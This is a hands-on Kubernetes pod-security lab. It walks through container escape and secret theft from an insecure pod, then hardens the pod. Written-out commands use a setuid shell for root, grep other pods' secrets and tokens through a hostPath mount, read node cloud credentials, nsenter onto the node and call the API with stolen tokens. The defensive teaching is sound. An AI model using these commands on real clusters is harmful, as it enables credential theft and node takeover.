# Pod Security


## The scenario

Your application has a vulnerability. An attacker sent a request that got them
command execution inside your container. That has already happened. This lab
starts the moment after.

We simulate that with `kubectl exec`. It is not the attack — it is the
starting line, exactly where a real attacker lands after exploiting a web app.

Every participant has a namespace with a Kubernetes Secret holding a unique
flag. Your `kubectl` credentials cannot read secrets — not even your own.
**Goal: collect as many other people's flags as you can, through the pod, not
with `kubectl`.**

**Rules:** read anything, destroy nothing. No rebooting, no killing
processes, no deleting or overwriting files on the node. Stay in your own
namespace with `kubectl` — everything else goes through the pod.


## Setup

1. Export the kubeconfig your instructor gave you: `export KUBECONFIG=$PWD/sNN.kubeconfig`
2. Confirm you can't read secrets: `kubectl get secrets` (expect `Forbidden` — remember this)
3. Deploy the target pod: `kubectl apply -f manifests/insecure-pod.yaml`
4. Wait for it to start: `kubectl get pod app -w` (Ctrl-C once it says `Running`)
5. Open `manifests/insecure-pod.yaml` in an editor and leave it open — every comment in it is numbered to match a control below.


## Step 1 — Recon: where am I?

1. Get a shell: `kubectl exec -it app -- bash`
2. Who am I: `id` → `uid=1000(appuser)`. A normal user, not root.
3. Your own flag: `cat /etc/app-secret/flag.txt`. Note it down — you'll see it again from somewhere unexpected.
4. The node's processes, not just yours: `ps -ef | head -20`. Find `kubelet` — that process belongs to the node, not your container.
5. The interesting directory: `ls /host/var/lib/kubelet/pods` → `Permission denied`. The door is open, you're just not important enough yet.

Nothing has escaped the container. You are still in the room.


## Step 2 — Get root inside the container

*Controls 1, 2, 3*

1. `ls -la /usr/local/bin/vulnbash` — note the `s` in `-rwsr-xr-x`: the **setuid bit**. It runs as its owner (root), no matter who calls it. Real images ship this same bit on `sudo`, `su`, `ping`, `mount`, `pkexec` (CVE-2021-4034, PwnKit, was exactly this).
2. `/usr/local/bin/vulnbash -p`
3. `id` → `uid=0(root)`. One command, no exploit needed.

Ask yourself: has anything escaped the container yet? No — you're root in a
windowless room. Try the command that failed in step 1 again.


## Step 3 — Take the node's disk. Take everyone's secrets.

*Controls 4, 5 — the main event*

Still root from step 2:

1. `ls /host/var/lib/kubelet/pods | head` — the command that said `Permission denied` two minutes ago.
2. `ls /host/var/lib/kubelet/pods | wc -l` — every pod on this shared node.
3. `grep -rh LAB-FLAG /host/var/lib/kubelet/pods/ 2>/dev/null | sort -u` — **post your flag count in the chat.**
4. `ls /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null | head` — everyone's Kubernetes credential too.
5. `ls -la /host/etc/kubernetes/` and `head -20 /host/etc/kubernetes/azure.json 2>/dev/null` — the node's own cloud credentials.

Every flag you just read belongs to a Secret in a different Kubernetes
namespace — one your `kubectl` cannot touch (try `kubectl -n s03 get secret
flag` from another terminal: `Forbidden`). A Kubernetes namespace is a folder
in the API. A Linux namespace is what actually isolates a process. You walked
straight through the Kubernetes one because it only ever existed in a
database — `hostPath` gave you the node's real disk instead.

**Nothing was exploited.** No CVE. Somebody wrote `hostPath: /` in a YAML file
and somebody else approved it. If this pod had been non-root with every
capability dropped and no privilege escalation, `/host` would *still* be
mounted — `hostPath` makes step 2 irrelevant. `readOnly: true` would not have
helped either; every path above still reads fine read-only.


## Step 4 — Get a shell on the node itself

*Control 6 — skip if you're behind*

1. `nsenter -t 1 -m -u -i -n -p -- bash`
2. `hostname` — an AKS node name, not your pod.
3. `ls /var/lib/kubelet/pods` — no `/host` prefix any more. There is no container any more; you're a process on the node.
4. `crictl ps 2>/dev/null | head` — every container in the room.
5. `exit` — back into the container.


## Step 5 — The credential you didn't know you shipped

*Control 7*

1. `ls -la /var/run/secrets/kubernetes.io/serviceaccount/`
2. Use it:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets/flag \
  | jq -r '.data["flag.txt"]' | base64 -d; echo
```

This needed no root and no shell — a bug that reads one arbitrary file (an
SSRF, a path traversal, a log viewer with a filename parameter) is enough.

**Stretch goal:** you collected other people's tokens in step 3. Use one —
same command, different `$TOKEN` and `$NS`.


## Step 6 — Harden it

1. `exit` — leave the pod.
2. `diff manifests/insecure-pod.yaml manifests/hardened-pod.yaml` — note what did **not** change: same image, same service account, same flag mounted at `/etc/app-secret`. Only the security settings moved.
3. `kubectl delete pod app`
4. `kubectl apply -f manifests/hardened-pod.yaml`
5. `kubectl get pod app -w` (Ctrl-C once `Running`)


## Step 7 — Try it all again

Before each command, predict what will happen.

```bash
kubectl exec -it app -- bash

id                                                        # ?
ps -ef                                                    # ?
/usr/local/bin/vulnbash -p; id                            # ?
ls /host                                                  # ?
nsenter -t 1 -m -u -i -n -p -- bash                       # ?
cat /var/run/secrets/kubernetes.io/serviceaccount/token   # ?
cat /etc/app-secret/flag.txt                              # ?
```

### Scorecard

| Attack | Result | Why |
|---|---|---|
| `id` | `uid=10001` | `runAsNonRoot` + `runAsUser` — kubelet verified it |
| `ps -ef` | 2 processes | own PID namespace, node invisible again |
| setuid → root | still `10001` | `allowPrivilegeEscalation: false` |
| `ls /host` | no such file | no `hostPath` in the manifest |
| `nsenter` | permission denied | no `privileged`, no capabilities, own PID namespace |
| read token | no such file | `automountServiceAccountToken: false` |
| **read own flag** | **works** | nothing was broken to achieve any of the above |

That last row is the one to remember: hardening the pod cost twelve lines of
YAML and broke nothing.


## The seven controls

| # | Control | YAML |
|---|---|---|
| **Inside the container** | | |
| 1 | Run as a non-root user | `runAsNonRoot: true`, `runAsUser: 10001` |
| 2 | Drop all capabilities | `capabilities: { drop: ["ALL"] }` |
| 3 | No privilege escalation | `allowPrivilegeEscalation: false` |
| **Out to the node** | | |
| 4 | No privileged containers | `privileged: false` |
| 5 | No host directories | no `hostPath` volumes |
| 6 | No host namespaces | `hostNetwork` / `hostPID` / `hostIPC`: `false` |
| **Out to the cluster** | | |
| 7 | No service account token | `automountServiceAccountToken: false` |
